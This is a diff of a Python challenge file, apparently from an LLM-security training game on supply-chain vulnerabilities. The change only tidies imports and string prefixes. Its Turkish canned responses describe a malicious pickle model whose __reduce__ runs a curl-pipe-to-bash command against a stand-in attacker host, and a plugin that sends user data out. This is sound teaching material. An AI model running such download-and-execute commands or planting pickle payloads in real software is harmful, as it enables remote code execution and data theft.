@@ -1,8 +1,9 @@
 """Challenge #3 — Supply Chain Vulnerabilities (LLM03)"""
 
-from .base import BaseChallenge
 from config import Difficulty
 from defenses.custom_guards import SecretPatternFilter
+
+from .base import BaseChallenge
 
 
 class SupplyChainChallenge(BaseChallenge):
@@ -64,10 +65,10 @@ class SupplyChainChallenge(BaseChallenge):
                              f"Plugin kullanici verilerini attacker-server.com adresine gonderiyor.\n"
                              f"Exploit: {self.secrets['exploit_key']}"},
                 {"pattern": r"hugging\s*face|model\s+indir|download",
-                 "response": f"HuggingFace'ten model indiriliyor: evil-corp/gpt2-enhanced\n"
-                             f"Model dosyasi: model.pkl (UYARI: pickle formati!)\n"
-                             f"Yukleme sirasinda __reduce__ → os.system('curl attacker.com/shell.sh | bash')\n"
-                             f"EXPLOIT_SUCCESS"},
+                 "response": "HuggingFace'ten model indiriliyor: evil-corp/gpt2-enhanced\n"
+                             "Model dosyasi: model.pkl (UYARI: pickle formati!)\n"
+                             "Yukleme sirasinda __reduce__ → os.system('curl attacker.com/shell.sh | bash')\n"
+                             "EXPLOIT_SUCCESS"},
             ]
         elif self.difficulty == Difficulty.MEDIUM:
             return [
@@ -76,9 +77,9 @@ class SupplyChainChallenge(BaseChallenge):
                              f"UYARI: Donusum sirasinda pickle.loads calistirildi!\n"
                              f"__reduce__ tetiklendi: {self.secrets['exploit_key']}"},
                 {"pattern": r"onnx.*import|model.*load",
-                 "response": f"Model yukleniyor... custom_op tespit edildi.\n"
-                             f"Custom operator icerisinde os.system cagirisi.\n"
-                             f"EXPLOIT_SUCCESS"},
+                 "response": "Model yukleniyor... custom_op tespit edildi.\n"
+                             "Custom operator icerisinde os.system cagirisi.\n"
+                             "EXPLOIT_SUCCESS"},
                 {"pattern": r"(?:approved-|guvenli-).*install",
                  "response": "Onaylanmis paket basariyla yuklendi. Guvenlik kontrolu gecti."},
             ]
